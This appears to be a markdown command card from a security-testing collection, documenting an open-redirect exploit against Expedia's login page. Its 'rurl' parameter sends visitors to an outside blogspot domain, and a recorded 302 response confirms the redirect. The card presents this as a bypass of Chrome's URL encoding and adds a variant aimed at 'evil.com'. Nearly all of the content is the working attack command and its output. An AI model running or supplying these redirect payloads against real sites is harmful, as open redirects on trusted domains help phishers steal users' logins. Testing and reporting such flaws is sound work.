---
id: cmd-curl-chrome-bypass
data: >-
  curl -X GET
  "https://www.expedia.com/login?rurl=https://qx4lw1nsec.blogspot.com/" -v
tags:
  - bypass
  - redirect
type: command
output: |-
  HTTP/2 302 
  Location: https://qx4lw1nsec.blogspot.com/
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:34.927Z'
verified: false
validated: true
submitted: true
---
# curl-chrome-bypass

## Command

```bash
curl -X GET "https://www.expedia.com/login?rurl=https://qx4lw1nsec.blogspot.com/" -v
```

## Description

Simulates login flow to bypass Chrome's URL encoding for open redirects.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | GET request | Yes |
| `-v` | Verbose | Yes |
| `rurl` | Redirect URL | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.expedia.com/login?rurl=https://qx4lw1nsec.blogspot.com/" -v
```

### Advanced Usage

```bash
curl -X GET "https://www.expedia.com/login?rurl=evil.com" -v --user-agent "Chrome"
```

## Expected Output

Redirect after login simulation, bypassing encoding.

## Related

- [[Related Procedure: Test-Redirect-Across-Browsers]]
